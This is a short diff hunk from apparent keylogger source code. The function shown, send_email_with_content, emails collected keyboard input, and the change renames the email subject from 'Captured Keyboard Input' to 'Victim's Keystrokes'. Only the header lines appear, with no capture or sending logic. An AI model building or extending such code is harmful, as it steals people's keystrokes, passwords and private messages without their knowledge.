@@ -67,7 +67,7 @@ def send_email_with_content(content):
     # Set email headers
     msg['From'] = from_email
     msg['To'] = to_email
-    msg['Subject'] = "Captured Keyboard Input"
+    msg['Subject'] = "Victim's Keystrokes"
 
 
     # Attach the collected text content to the email body
